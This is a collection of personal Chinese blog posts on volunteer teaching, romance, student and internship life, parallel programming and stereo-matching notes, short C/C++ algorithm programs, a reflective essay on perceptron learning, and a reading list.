    我们都是来自五湖四海为着一个共同的革命目标走到了德基金大家庭中，前段时间刚找完工作就和爱心达人郑朋给这边投了简历。过来之后见到了各个专业的牛人，学舞蹈的童话姐，练武术的刘政队长，当然还有我们的重量级人物中国十大山水画家孙金龙老师，湛江的叶老师，最年轻的是广州的杨老师。这样充满爱的大家庭中在德基金工作人员（潇潇姐，晓玲姐，美玲姐，当然还有能哥！哈哈）的帮助下每天都有条不紊的运行着给支教的学生们送去满满的爱和知识。与其他德先生相处的日子中，我学到了很多代课的经验，孙老师的启发式教学，童话姐一丝不苟的态度，刘政队长的领导才能和孩子们互动的方法，以及同为陕师大小分队文瑾老师精心的准备都让我受益匪浅。队长说聚是一团火，散是满天星，虽然现在支教结束了，但是我们助人为乐的精神要传承下去，我们回到各自的学习和工作岗位上以后，在神州大地上会继续发挥着自己的光和热。践行自己的宣誓----尽己所能，奉献心智，不计报酬，帮助他人。
 
离别是为了更好的重逢
    时光飞逝，一周的艺术支教匆匆结束，快要离开的时候，我给每个同学都留下了自己的期许，孩子们也给我写了些自己对上课对篮球运动的感悟，看的出来她们都很喜欢体育运动也喜欢和王老师一起上课做游戏学篮球。
 
    我在上课的时候总是希望把自己知道的有关篮球的一切都交给孩子们，甚至怎么扣篮，这也算是理想主义的一种吧情怀吧。不知道是不是天气的原因，周五支教结束的学校气氛有点沉闷，快要上车的时候明媚同学昂着头问我，老师，你还会不会回来？我一时不知道怎么回答她，她说，我知道你可能不会有时间回来了，你要回家了，但是我会听你的话，好好学习，好好锻炼。
    听到这样的话，走的时候我们都没有哭。
 
结语
    我想也许，我们今天的支教是为了明天的不支教，希望在不久的将来，中国的每一个孩子们都会得到平等的教育机会，得到全面自由的发展，那时候支教或许会变得全无“用武之地”，我期待着这一天的到来。
﻿﻿







       小黑是我老公，因为黑，第一次见他在晚上，就看不清脸，所以以后就叫他小黑。       遇到小黑之前，我是个有着强烈”社交恐惧”的人，甚至和人说话不敢直视别人的眼睛，可是这些在小黑这里根本不存在的，因为他黑的根本就找不到眼睛。       14年前我25岁，研二，躺在宿舍里看《科幻世界》，读着一篇叫《天蝎碎片》的故事，故事里，一颗行星正在炸裂，它的碎片穿越大气层散落在地球，于是，那一天，在世界不同的地方，几个带有天生缺陷的孩子诞生了，在以后的10几年里，他们各自痛苦的成长，直到，有一天，神秘的宿命将他们召集在一起，然后他们的痛苦消失了，拥有了神奇的能力。       听上去不错，于是我打开QQ，搜索生日群，进去吼了一嗓子：有80年的没！于是小黑出现了。       小黑说他最大的错误就是进那个生日群，一去误终身。       没错，我们是网友，在那个网恋热还没有消退的年代，这也不稀奇。      我是个怕吵的人，白天，大多数时间宁可呆在实验室也不愿回宿舍，闲暇时唯一的乐趣就是网上“骚扰”小黑，因为总是下一秒就能得到回复。      我：“你在干什么呢”      小黑：“上班呢”      我：“你是做什么呢”      小黑：“工程监理，就是天天跑工地，你在实验室呢”      我：“是的。”       小黑：“我也喜欢编程，你用什么语言”       我：“C++”.     小黑：“好厉害！”      我：“你呢”      小黑：“汇编”      我：“。。。。。。”      说实话我第一反应这人是吹的，后来才发现是真的，于是我问他为什么不去做开发，拿更高的薪水，他说，兴趣而已，做工作就没意思了。      这是小黑第一次给我的好感，除了以前在寂寞的时候陪我聊天，这大概是我第一次觉得他是个大智若愚的人。     那时我们还是网友，他从不主动说话，但总是秒回，有问必答，诚恳到不掩饰任何东西。      有一天，他有了一个论坛，里面有几个同学，想一起写小说，欢迎加入      我是个晚熟的人，情商不高，写不出好东西，但是那段日子，翻看伊勤的内心轨迹成了我的生活调剂。      印象最深的，就是在他紧张时，会把生活想象成演电影，瞬间把自己带入角色，于是就会洒脱许多    我开始慢慢向往他内心的沉静，随和，让人丝毫没有压力的存在。      于是我们见面了，约见在上海人民广场。      我在博物馆门前数石狮子，数到最后竟然看到一个很像“辛巴”的狮子，一回头看到他在远处东张西望。      没错，我的童话来了。      傍晚，他很黑，走了一路脸上油光光的，瘦高，不帅。坐下来第一件事，打开湿巾递给我：擦脸吧？      明明是他一脸油光，为何让我擦脸？      后来发现，他清奇的脑回路是，大热天，我怎么好意思在女孩面前一个人擦脸。      事实上他不好意思做很多事情：      在车上遇到任何年长或年幼的人，不好意思不让座      人家上了六楼推销东西，不好意思不买      打车司机车开的差点撞到头，不好意思不给5星。      剪头发剪伤耳朵，不好意思不给钱      。。。。。。    女友患抑郁症，不好意思丢下她     我明白了，我下定决心跟他在一起，一定是因为这个傻瓜激起了我强烈的保护欲。      想写一些关于小黑的东西很久了。但是写下去不免暴露太多个人的东西，怕有矜情作态的嫌疑。     要不要写，犹豫好久，后来听说好夫妻到最后都过成了好兄弟，我怕再不表达，我就真的老了。      昨天，是我们阴历39岁的生日，我请小黑吃寿司（没错是我请）。      傍晚，在家匆匆收拾房间，洗澡，买花（没错，是我买花）。      赶到料理店的时候，他已经坐在那里大吃大嚼起来（没错，已经吃起来）。      见我过去坐下，拿起桌上的湿巾，说：擦脸吧！     我笑了，于是决定试试写这篇文章,半夜起来，想到哪里写哪里。太长了，没写完。     见笑了。
 








大家镇定一下情绪，文章要开始了。

不择手段是人杰，不改初衷是英雄！
年前读了老罗的这本书—— 
《一个理想主义者的奋斗，The Adventures of an Idealist》回想起了我与新东方的故事
我与新东方的故事，大砥开始于高二，那时候英语不行，去New Oriental上了新概念英语跟高考英语的补习班，老师大都海龟，经常说些什么外国人英语很差算数也不好之类的老梗来激发无知少年的求知欲，是啊，外国人那么搓凭什么说英语啊。后来上了大学，不知道听谁说的cet很难过，就又报了新东方厨艺训练学院。这次充电经历，完全领略了new oriental的核心价值，每个老师都带着自己的励志故事教导我们所有成功学书籍都会同时花言巧语教导我们的成功学基本原理—-只要努力，就能成功！
这么多年过去了，我依然能够念念不忘这里，源于这个核心理念或多或少改变了我的人生道路，我坚信至少努力过就好像保尔柯察金不因碌碌无为而羞耻，不因虚度光阴而悔恨一样具有极高的精神鞭策意义
前几天中考，我就记起我那年中考，一同学只答了一个多小时就匆匆交卷，考试结束后，等待在考场外的班主任怒目圆睁的质问他为什么不好好检查。其实都到那会了，眼看毕业散去五湖四海，班头干嘛还给自己找不愉快呢，连王小波都说了，在这世界上的一切人之中，我最希望予以提升的一个，就是我自己。这事要搁我身上顶多踹这熊孩子两脚，自己肯定不会动气，都毕业了还管什么啊。想到这块，就忽然明白了在职业精神上和当年班头的差距。不改初衷真英雄，在这个讲究强者自救的时代，能够渡人的老师，恐怕要归为圣者之列。 a strong man can save himself,a great man can save another。
我也因此而更喜欢老罗这人了，他带有知识分子特有的社会责任感，坚持真理，用他的风格行走在江湖之中，此处向他致敬。

生活不只眼前的苟且，还有诗歌和远方的田野！

There is a pleasure in the pathless woods 
  There is a rapture on the lonely shore 
  There is society, where none intrudes 
  By the deep sea, and music in its roar 
  I love not man the less, but Nature more  
  –Lord Byron

每隔一段时间，我好像都会油然而生一种放下手中的一切，去没人的地方纯粹认真的活一段日子，好像平时从没认真的过活一样的重活一次，那年我产生这样情绪的时候，我去了可以荡涤灵魂的西藏。一路上我充满了迷惑，学姐的一句话，让我在巴松错湖边吹风时忽然感到一种想要跟人倾吐：没有你，良辰美景更与何人说？的冲动。学姐当时问我：你又没妹子，一个人在外面瞎转悠什么啊。。。
直到最近看了电影 《into the wild》，原来每个青年都会和我一样，有过这样迷茫的时期，人终究是喜新厌旧的，每天吃一样的饭，过不了多久就要厌烦。于是the core of man’s spirit comes from new experience，就要去尝试新鲜，新的菜，新的馆子，新的环境，这就是荡涤灵魂！然而没过多久，就要回老地方看看，这就是怀旧。
人终究又是朝三暮四的，以上无休止的反复折腾中，又开始怀疑这一切。 
电影中，Alexander 的那些摆脱消费世界的诱惑，摆脱权钱世界人与人之间关系的虚伪，毫无保留地 投入完全原始 自然的观点，是一种怀疑过后的彻底决裂，是年轻读书人反思世界的极端而浅显的深刻，是真诚而可贵的故作姿态。
我们都有历尽千帆却想回头的那一刻，却终究回不了头，弯路走的越多回头就越难，三井哭着跪倒在安西教练面前那一句：教练，我想打篮球，就是我们这个时代人准备浪子回头，重新做人的代名词。
alexander走了这么远，在读到托尔斯泰的《家庭与幸福》:

I have lived through much, and now I think I have found what it needed for happiness. A quiet secluded life in the country, with the possibility of being to people to whom it is easy to do good, and who are not accustomed to have it done to them. And work which one hopes may be of some use. Then rest, nature, books, music, love for one’s neighbor. Such is my idea of happiness. And then, on top of all that, you for a mate, and children perhaps. What more can the heart of a man desire?”
(最后这句，有你为伴，夫复何求)却突然产生了想要回去的念头。这和当时湖边的我念头是何其相似，一曲肝肠断，天涯何处觅知音，幸福的本源来自分享，happiness only real when shared ，alexander发现这个奥秘的时候，孤独的死在了天堂巴士之上，所谓朝闻道，夕死可矣，alexander的人生倒也算是没有什么遗憾了。






研二这一年，我还记得从搬到五楼一人独占一个大桌开始，用神舟战神企图编译出可以并行跑的OpenCV，谁知道i7最顶级的处理器编译一次也要十几个小时，后来出了个bug较多的版本，不是很满意。又转用OpenCL，这下搞上两个lib和dll就能用，可后来战线拖得太长，索性放下了。这个事情，让我忽然想到了我的坚持。
我依然坚持的爱好有三，篮球，电影，文艺（如果写这篇文章还算是文艺范畴的话）
只要还有乐趣，就不能放弃。年龄见长我就更加发现，坚持下去的东西要么成了爱好要么成了负担。
不明白现在华语电影都是什么准入门槛，一个电影动辄票房上亿。我国光是2015年上半年电影总票房就高达200亿元。最近满怀欣喜看了《道士下山》首映，结果前半部是范伟饰演了武大郎版本的《水浒传》，后半部是水墨画武侠版本的《断背山》。
回忆起后来有一周早上没事，想跟张老师看个早场电影，冲着一众影帝选择了《赤道》，本以为包场，不想最后进来个小朋友跟我们一块坐最后一排，整个电影院大清早就我们仨，一场梦过后，电影结束灯光亮起。小朋友突然用非常迷惑的感叹语气，问到：这啥么这?!小家伙拍拍屁股，带着我们所不能理解的情怀，头也不回的走出了影院。

earning my living，burning my soul
2014年12月31日至今，我竟然再没有写过日志，你知道，有了年纪和经历之后，任何故事就会变的很凄凉和无奈，这就是人们常说的笑点变高。我虽然没有再记录什么也并不代表，我对远远跑赢cpi的上证指数能够做到漠不关心。上证即将翻越唐古拉山口的时候我俨然看到了房产证的希望。后来有一个前辈听说我玩股票，每次都要告诫我说，你年纪轻轻，千万不要写代码不要读博。我心想这哪跟哪啊，后来有一天我意识到，那前辈用上海口音说的是不要吸大麻不要赌博。。。岁月流逝，我唯一的优点就是长的还够帅，但帅不能推动祖国GDP增长，为四化建设添砖加瓦。有一天我意识到有可能将来我也要，earning my living，burning my soul，但做人最要紧的就是开心，我就卖了所有股票捐给希望工程，股票不能改变中国，但也许希望工程可以。
啊，美丽的西安国立西安大学，我就要离开你了。五湖四海四面八方的同志们忽然汇集于西安市太白南路168号，四年的时间在波澜不惊里浓墨重彩的走着。三年前离校的时候，我本来想写点东西缅怀一下过去，上面就是文章的开头。文章还没写完转眼间，我们都大学毕业3年了，高中毕业7年了，初中毕业10年了，再有之前的同学见到我，问我最近在那里发财，我 说：上学呢，他说，你还上学！每次问你都是上学！三四年前见你时候上学！我结婚你上学！现在我娃满月了你还上学。我也觉得学上到快被社会遗弃了默默的低着头打开支付宝，上一笔份子钱还在聊天记录里静静的躺着。。。

高山流水觅知音
2015年的大半已经过去，我很怀念她，说起来跟张老师的恩怨情仇，令我记忆尤深的就是 张老师众多闪光点中最耀眼的那一抹—— 饭量不错，吃嘛嘛香！以下进入张老师学生的写作手法，记得有一次，张老师请我吃饭，我却突然肚子疼。她可怜的看看我又看看满桌 的饭菜，充满关爱的安慰我道，（陕西话）不要担心，莫斯，额能吃完，不会浪费！这一句说的斩钉截铁，字字透出威严，充分体现了一个人民教师的责任感，她不但在课堂上教育学生，汗滴禾下土，粒粒皆辛苦，在日常生活中更是以身作则，不愧人类灵魂工程师这一伟大的称号。此处应有掌声！
今天夜里送完张老师回家，我坐了一辆黑车，银色面的，上车后拉门坐下司机启动开车整个过程一气呵成，途中师傅放起了似乎是法语，伴着鼓点的动感音乐，节奏和音量都令人舒适异常，司机师傅一言不发，我们似乎陷入了某种默契。车上车窗全开，穿堂风迎面扑来 
，望着外面飘然而过的霓虹灯，此时此刻，世界的光亮声音都和我融为一题，仿佛置身于流畅的梦境，梦境中我看到了过去的自己，现在的自己，未来的自己。也许多少年后，我不曾记得这样一个夜晚，但是对我来说,这样的生活就像山间的青草,就像野地的鲜花,曾经那样的繁茂。当微风吹过又吹远,大地知道一切都已改变。
永远年轻，永远热烈盈眶，共勉。


这张照片名叫《怀揣着梦想的程序员》我非常喜欢，特别鸣谢摄影师：李欣 
背景介绍，那是1939年二月，当时的延安经费紧张，同志们吃不好饭，睡不好觉，但每个人都怀揣着理想的革命乐观主义精神，努力学习科学文化知识，为来年夏天的战斗做好准备。
ps，题目中的“治疗”俩字打成自己了，谢谢大家。
ALL RIGHT RESERVED!!! 








﻿﻿

1.Intel Parallel Studio 环境下的并行程序设计

书官方网站的详情页：

http://www.wrox.com/WileyCDA/WroxTitle/Parallel-Programming-with-Intel-Parallel-Studio-XE.productCd-0470891653.html
可以下载相关代码


2.在使用并行计算来优化自己的串行程序之前，我们需要思考以下几个方面的问题
什么情况下需要并行？
并行能够带来多少性能的提升？
编码和调试的时间成本？
（串行代码早都搞出来了，并行搞出来的还不一定对，并行时间上的提升是否能够低效开发并行程序的人力资源成本？）



两个计算期望的加速比经常用到的定理Amdahl定理，和Gaustafson定理
http://baike.baidu.com/link?url=lqc1D3ifZGLa46fDN1xcxhGHQZmTsrq5ZAoYJVoPLOfAmp1KlqobXvvm9WYhJyRkbzFctsNBHIKc_HVRfIW4Sg1no8VL7KJVmd9Co0KLnMxHp7WK0OfuIXyxCh9oPAoTVQwlncECy_y1B6h0P9MZ9azvSIuRtJesAjztytIT4BC



理论上认为对于并行计算中的可扩展性（Scalability），一个程序的加速比随着处理器核数增加而变化的情况，一个完美的可扩展程序在一个四核计算机上应该是双核计算机的两倍速度。


3.实验：

并行回溯法计算数独（可能需要Intel的编译器）
资源：
http://download.csdn.net/detail/wangyaninglm/9195537


编译的时候要打开vs 的openMP选项：


串行算法：可以看到速度非常快：




书上的串行算法：

openmp并行算法：








#include <stdio.h>
	
int m,s,n;
int i,j;
int a[100][100];

int sf(int n)
{
	if(n%2!=0)
		printf("输入参数不合法!");
	else if(n==2)
	{
		a[0][0]=1;
		a[0][1]=2;
		a[1][0]=2;
		a[1][1]=1;
	}
	else
	{
		sf(n/2);
		m=n/2;
		for(i=0;i<m;i++)
			for(j=0;j<m;j++)
			{
				a[i][j+m]=a[i][j]+m;
				a[i+m][j]=a[i][j]+m;
				a[i+m][j+m]=a[i][j];
			}	
		
	}
	return 0;
}



void main()
{

    printf("输入运动员个数:");
	scanf("%d",&n);
	s=sf(n);
	if(n%2==0)
	{
		for(i=0;i<n;i++)
		{
			for(j=0;j<n;j++)
			{
				printf("%4d",a[i][j]);
			}
			printf("\n");
		}
	}
	else
		printf("\n");

	getchar();
	getchar();
}

	


 








解决方案：

int _tmain(int argc,_TCHAR* argv[])
{
    size_t fib[] = {1,2,3,5,8,13,21,34};
    string str,tempstr;
    cin >> str;
    tempstr = str;
    auto it = unique(tempstr.begin(),tempstr.end());
    tempstr.erase(it,tempstr.end());    // 去重(已假定是有序的，如果无序则先排序)
 
    for (auto itstr = str.begin(); itstr != str.end();)    // 遍历输入数据
    {
        string s(itstr,str.end());   
        for (int i = 0; i < 8;i++)
        {
            if (fib[i] <= tempstr.size())    // 符合FIB的不同字符有多少，则输出多少次
            {
                auto singlechar = tempstr[i];
                auto findchar = s.find(singlechar);
                for (auto itchar = s.begin() + findchar; itchar != s.end()&&*itchar == singlechar;itchar++)
                {    // 输出，相同字符连续输出
                    if (*s.begin() == singlechar)    // 每次去掉第一个相同的字符
                    {
                        itstr++;
                    }
                    cout << string(s.begin(),itchar+1) << endl;
                }
            }
            else
            {
                tempstr.erase(tempstr.begin());    // 字典输出需要
                break;
            }
        }
    }
 
 
    return 0;
}



讨论贴：
http://bbs.csdn.net/topics/391023839

后面碰见有关斐波那契数列的题目非常多，这块还有一个求期望的：
http://bbs.csdn.net/topics/391822110
正确答案：
http://blog.csdn.net/u010476094/article/details/48110405
这他妈的也太难算了吧







《Effective large scale stereo matching》
In this paper we propose a novel approach to binocular stereo for fast matching of high-resolution images. Our approach builds a prior on the disparities by forming a triangulation on a set of support points which can be robustly
 matched, reducing the matching ambiguities of the remaining points. This allows for efficient exploitation of the disparity search space, yielding accurate dense reconstruction without the need for global optimization.


       该文章发表在2010年的accv上面，看了一下公式和代码都异常复杂，主要思想就是通过待匹配图像上的特征点作为匹配的支撑点，在支撑点上做三角剖分，对视差在进行插值计算，但是效果一般，适用于实时性要求高的场合。

       整个工程都用OpenCV和openmp 完成，代码异常复杂，但是整体上非常吻合工程师的代码风格，可以学习一下，但是改进难度比较大。

效果：明显看出效果和普通的全局优化算法还是有一定的差距。







文章下载链接：
http://www.cvlibs.net/software/libelas/
http://www.cvlibs.net/publications/Geiger2010ACCV.pdf





代码下载链接：
http://www.cvlibs.net/download.php?file=libelas.zip

openmp版本：运行时间非常短大概0.1s左右完全满足实时性要求。

http://www.cvlibs.net/download.php?file=libelas_omp.zip

我调试好的工程：
http://download.csdn.net/detail/wangyaninglm/9321831
﻿﻿







写在前面，此文的目的只是单纯地跟大家分享自己对感知机学习的一些感悟。并不是科普文，对感知机没有认识的朋友可能并不能从此文得到清晰的概念，如果要学习感知机还是建议看经典的教材。        ==========正文==========想写这样的文章很久了。至于动机，说来话长。先允许我矫情的自我介绍一下。我的成长环境相对来说比较封闭，传统甚至是严苛。导致我性格当中有很多紧张的成分，同时不善于交往。直到碰到为数不多的朋友前，我的人际关系包括个人感情，不出所料的“一塌糊涂”。于是某一时刻，我想结束这种自卑与尴尬。我的选择也许你不能理解——探索“人工智能”。因为我不能左右逢源，因为不能做大众眼中的“聪明人”，所以我想用这种方式去接近“智能”这个概念。以此探究什么是“聪明”因为我总是遭遇“尴尬”，所以我想用探究“智能”的方式来理解“成长”或者说“学习”的本质。所以我所写的文章，我所做的思考，总在把“智能学习”投射到“人生思考”上。我不知道有没有造成“牵强”的感觉，实际上我只是在尽量表达我的理解。研究生我选择模式识别和图像处理，那一刻我觉得自己充满了力量，不在寄托他人或他物来寻求内心的平衡。接下来的学习并没有令我失望。实际上当第一次接触到“感知机”——最简单的机器学习模型时，我有种豁然开朗的感觉。感知机，模仿神经元，是神经网络中的基本单元。它有多个输入，一个输出。输入后，每个输入Xi乘以相应权重Wi相加，其总和再通过与阈值B相减，得到一个大于等于0或小于0的值，若大于0，输出1，否则输出-1。现在如果感知机被训练“成熟”，能正确输出“+1”、“-1”，判断“是”、“非”。即，将所有样本点正确分类。那么想象它的权重向量W和偏移B，构成了一个超平面。这个超平面把这个世界一分为二，若一边“是”的样本，一边“非”的样本，它本身，就是是非的准则。在面对两类样本，要完成“是”与“非”的判断时感知器傻傻的伸出一条线Y=WX+B(此时W,B有随机性)，试图探索。然而除非你是“神派来的宠儿”，否则面对新的事物，无法“一蹴而就”。事实是这样，感知器毫不意外地得到了错误的分类。即：我们在对的世界里抽取一个样本x给感知器就判断，试图得到+1。但是由于错误的判断，感知器返回了-1。也就是按照刚才那条直线y=wx+b去探索，得到y=-1。此时的感知器不会像人一样陷入自责、畏惧，而是自然而然的调整方向。怎么调整？既然不对，我就回头。怎么回头？首先调整“是非”判断整体倾向，再向本次经验“对”的方向靠拢。如果用绘制图像来阐述，那就是，如果“是”判断成了“非”，超平面首先朝“是”的反方向平移，相当于降低阈值。这样造成我们判断的结果整体倾向于“是”。接着，我们假设此时空间样本点为X0,那么其正确结果应为“是”，即“+1”,我们把空间点(X0,1)构成的向量称作V，是我们期待的正确方向；现在我们的分类超平面Y=WX+B，试图朝着方向V旋转，以做调整。这种调整如何得来，为什么它是正确的？因为如果我们把X0样本点进行了错误归类，产生错误结果-1。那么这次错误的损失可以量化为-(WX0+B)。当X0已知，我们想针对(W,B)寻求一种变化，这种变化的结果使以上损失接近最小值，那就是沿着的梯度方向走，也就是朝变化最快的方向调整。-WX0-B分别对W,B求偏导，得出最佳调整方向(-X0,-1)W=W-X0B=B-1如果直观一点来讲，如果你认为一个人秃顶程度象征一个人的猥琐程度，那么猥琐到一定程度你把他归类为一个“坏人”。直到有一天你遇到一个秃顶的程序员，你发现他很善良。这个事实对你来说，就是样本X0。于是你开始调整自己关于“猥琐”这个观念的分类线Y=WX+B。首先你调整B，把分类为“坏人”的阈值提高，也就是说，不再轻易把一个人定义为“坏人”。B=B-1。第二步你调整W，因为之前你认为秃顶是猥琐的，所以错判了一个安分的人，所以你现在朝着相反的方向改变这个观念，当然不是从此判定“秃顶”是不猥琐的，而是，以前认为“秃顶”是“猥琐”的观念不再那么根深蒂固，换句话来说，你并未因为照顾这个样本走到另一个极端，而是背离这个带给你一次错误的观念，回头那么一点点。W=W-X0。当然人是立体的，你判断一个人，一个事物也是立体的，所以你观念中的维数，不止上述一维。多维情况只是一维的简单扩展。用简单一点的话概括，如果产生错误的判断。先调整阈值，再在每一维参与判断的权重中，向相反的方向回头调整不用畏惧笨手笨脚，学习的本质就是实践和探索，在“样本”之间调整，而这个调整，也没想象的那么复杂，遇到“不对”的，回头就是。无数次碰壁与回头，总能找到最佳的是非状态。然而，回头，是走向另一种极端吗？不是，是在前面的经验的调整而已那么，为什么我们自信可以用这种方法调整到最佳分类状态。因为感知机的收敛性早已得到了充分的证明。感知机算法在训练数据集上的误分类次数k满足不等式这个收敛性证明是建立在两个假设上(证明略)(1)假设样本是线性可分的，即存在一个最优超平面将两类样本分开。样本点到最优分类面的最短距离为(2)假设样本点的长度是有上界的。上界为误分类的次数k是有上界的，经过有限次搜索可以找到将训练数据完全正确分开的分离超平面。也就是有限次尝试，我们可以达到最佳状态。我们经常畏惧失败，焦虑，强迫自己学会应对复杂的问题，多次失败后往往把我们打击的体无完肤。但是却忽略了简单的本质，感知机怎么看起来像个傻傻的但不屈不挠的自己呢。这个世界给你带来的痛苦，只不过是你所经历的“样本”罢了，take it easy，你只要学会调整，回头，不要走到极端，你总会找到那个最佳的状态。当然，也可能不止这么简单。比如这个世界很复杂，那么就是说判断的维数很高，那么我们就提高样本的数量使“分类器”正确，就是我们遇到的事情越复杂，我们经历的尝试就应该越多，才能不落入“片面”或“不成熟”的看法。比如这个世界是非难分，那就是碰到了“线性不可分”的样本，那么我们就增加认识的深度，也就是给样本增加维度去看(支持向量机)，它也许，就变得清晰可分了。总而言之，我对“智能”“学习”的粗浅感悟就是，这个世界总是客观的，收起对它过度的情绪，置身物外，拿起理智，尝试去认识它。
 








写于:2013-7


  无码的睁大眼睛看，有码的眯起眼睛看，没有情节的直接删除
                        
   ----------------------这就是我所理解的生活！


我也许能够一直打着寻找自我的幌子，继续在这个社会招摇撞骗。凭良心说我喜欢千奇百怪的结果，于是这个刚刚走出校园的年头像一个gap year一样，我带着那个偏光镜把花花世界看了个遍，口水撒了一地。但是人不能太贪心，没有回国立西安大学当校长之前，我还是希望自己安生的积淀一点厚度。
每年的这个时候，好像年中工作总结一般的也要百无聊赖的憋出点感想出来，当然今年的这一篇是为了纪念这初出茅庐的一年，刻骨铭心的一年，以及这么灿烂绚丽的23岁。。。
这一年的时光铭记在人生历史长河中的时候，朋友们的脚印首先留下了浓墨重彩的一笔。
去年的这个时候，在单曲循环了无数次小虎队的《祝你一路顺风》之后，我在深圳城中村臭水沟和按摩城边上的一个快要废弃的小别墅里安顿了下来。后来发现这里蟑螂有异形那么大，台风能把不锈钢脸盆从阳台吹到客厅，后院为KFC供货的公鸡吃了激素每天从凌晨4点开始失眠，我也就养成了早起的好习惯。怪不得两百平米800块一个月！这么物美价廉。其实从在chinasoft报道的那天起，我就很庆幸之前培养了篮球这个爱好，是它在一开始打破了隔阂，先聚起了一小波人，中锋鹏鸣，大前锋峰哥和李明辉，小前锋我，后卫队长。半场4v4正好多了一个轮换阵容，但是只要我在场上进攻总是始于我没理由的浪投，止于其他三人稳定的发挥。后来博和其他几个人也加入了我们，可是没打几场，九月底，中软实习生篮球部就因为大家各走阳关道解散了。这里面深层次的原因竟然牵扯到了美国国家安全局棱镜项目以及欧盟对华为交换机的贸易反制，蝴蝶效应哇！
打篮球的几个Intern本身就是很幽默的家伙，博和建斌是两个更有趣的人，我们三个吃木桶饭的时候会伺机把最漂亮的小妹叫过来说来一个“手撕粉木耳”把，小妹妹总是笑笑说这个没有，完后博拿起菜单指着最下面最后一行最贵价值20元的那个“香辣带皮牛肉饭”，很认真的问：什么是‘香辣带皮’？
建斌是个高级技术宅，南方人外加标准普通港台腔，他总用工资买了最好的播放器和耳机听最高端的音乐以及最高端的计算机技术书籍。考研考了320分结果没去，自信满满的对自己考上的同学说：三年之后咱们比比看，到底谁比较厉害！可是刚来中软没几天他就认怂了，这么坑爹的公司哇可能我要输了。我走以后他进了项目组，有一天他说：其实工作吧，也就是那么回事，工作不能让你学会什么而是能让你明白，你不会什么，搞明白自己不会什么，这才真正重要！在这一点上，我是深以为然的。
我的卖萌室友博，是个武汉人，鸭脖子热干面吃多了就有点那种萌劲。博有一个梦想，将来开一个心理诊所，原来他这几年打定主意卧薪尝胆的搞IT都是为了以后能让世界上少几个我一样的神经病。共处一室他首先开始健身，后来我们一起为了腹肌留了很多汗。博有一个最大的优点就是坚持，坚持每天只吃千张肉丝美白肌肤，不管多累回来就是要坚持完成健身科目。而我因为每天早餐就要吃掉一份肠粉4个包子2个韭菜饼一个鸡蛋一杯豆浆一瓶果汁几个月下来效果很不明显，只练成了一块腹肌。
公司不能玩游戏，博就给我们写了一个贪吃蛇，群众喜闻乐见，只是蛇不能太长不然容易崩溃。后来听说，博在中软抗了六个月，也没有项目给他做，他于是过年都没有回家打工挣钱垒代码。我想这家伙应该明年就报考北大心理学了吧，精彩的青春果然是留给奋斗的人生的。
深圳一别，不知何时再能和这些一入IT深似海的实习生再见。终于，我也赶在中秋前夜，回到了生我养我的那片热土。
接着就马不停蹄的在省图开启另一次抱佛脚的旅途，这期间时光飞逝，插曲有两段。
其一是不小心打了一个也是学计算机挑衅占座的，比我还羸弱，当我用单手把他甩出去三米远眼镜都飞到楼下去的时候，他果断拨打了110并告诉我你等着吧，我没有迟疑。。。跑了。。。
之后依然是老哥自残式的做高数，我则无压力继续同济课后题，人吃呢？他一直二在奔三的路上，偶尔会有两个女生停下来欣赏他规划出来的城市CBD，我抹干净口水再默写一遍图的深度优先搜索。
最后的插曲是最后十天左右的样子，和可亲的学姐互相搭讪了，学姐的名字很有意境，性格又善解人意，给当时以及后来一段时间的生活平添了许多少年维特的烦恼，学姐善于夸奖别人，很多次我忍不住问你能不能不夸我了，她说那就没什么好说的了。
后来我又马不停蹄的找了工作，开始了规律的生活，将近六个月的时间，在百度，google，csdn的帮助下给老系统添加了新功能，并着手开发了一套新系统。从过年之后，忽然觉的这一年寻找存在感的旅途少了点什么，就趁着周末约见了曾经的一些姑娘和女神。一个姐姐告诉我原来最难的不是改变而是永不改变，徐言对此评论说这个操蛋的社会是总能让夜来香在白天也绽放的！！！这样的每个周末都注定是忙碌的，社会交给我了很多的新功能需要匆忙上线，周六雷打不动回文理打球。周一回去上班顺便补充睡眠。
即使档期安排的这么满，我依然没有忘记我们的龙仔需要加戏！！！
龙仔信佛，但是某个时刻我知道龙仔找了个女朋友的时候，我心想TMD这年头和尚都没有节操了！龙仔在国立西安大学的饭堂吃了四年的西红柿鸡蛋面，我首先代表未来的校长为你道歉，若干年后我接管这里，一定要下大力气提升学校的素食水平，不要让西红柿鸡蛋面看起来像是番茄酱拌面。
大学4年的时间一晃而过，当我们搬到了二号公寓楼的时候，每次去图书馆装逼路过龙仔他们宿舍，我会机械性的看看多子团灭了没有，雷哥又下了什么片子，龙仔在看什么漫画打什么单机rpg，最后叫醒学长，一起去搞基。龙仔在专业方面一直是剑走偏锋的安全方面，当然在我们系自己搞点啥都算是剑走偏锋。
再后来，这厮说跟他女朋友分手了，我只能说真不明白现在的和尚都什么专业素养。。。龙仔似乎毕业之后进了一家比中软还坑的坑爹企业，老板辞退了清洁工让龙仔顺便兼职也没有加工资，这种事情换做是我，老板的骨灰现在应该已经飘散在祖国的大江南北。但是龙仔信佛，慈悲为怀，也没有计较，努力工作为和谐社会添砖加瓦。早知道龙仔要离开西安了，也并不是多么突然，只是，这种感觉就好像去年我发毕业证盖完章子锁上大门，砰的一声，回荡在悠长的走廊里，4021教室里还会不会再坐满你们？
转眼间，生命中或多或少的这一个年头又要悄悄溜走了，我还没有顾得上和某个善良的女生交流人生。朋友已经有人结婚有人读博，眼见感情生活这一章又要继续在这个年头停滞不前了。
这时候。
龙哥告诉我说：我们还有篮球！
没错，你说的有道理！！！我说——

THE END
ALL RIGHTS RESERVED!

PS.我曾经希望，某个时段人生的背景音乐可以用《豪勇七蛟龙》，这个时段，我想应该可以试试了。
但是 但是，这一首更好！
最后的最后：是一张龙仔的高清无码大图！！！











书单目录序言1.《行走西藏》2.《***传》3《我所理解的生活》韩寒4《一个很高兴见到你》韩寒监制5《所有人问所有人》韩寒监制6《暗战亮剑——软件漏洞发掘与安全防范实践》7《程序员的思维修炼:开发认知潜能的九堂课》8《王小波，沉默的大多数》9《数字图像处理》冈萨雷斯10《并行程序设计openmp》11《c++沉思录》12《团队之美》13《独唱团》14《最好的时光在路上》15《opencv2计算机视觉编程手册》16《射雕英雄传》17《神雕侠侣》18《香港制造一梦十年》19《电影阻击历史》20《一座城池》韩寒21《偷影子的人》22《香港电影血与骨》2月5日23《程序员修炼之道，从小工到专家the pragmatic programmer fromjourneyman to master》24《精益开发实战--用看板管理大型项目 lean fromthe trenches managing large-scale projects with kanban》25《卓越程序员密码The Developer's Code What Real Programmers Do》26《活着》余华27《简约之美-软件设计之道》codesimplicity:The Science of Software 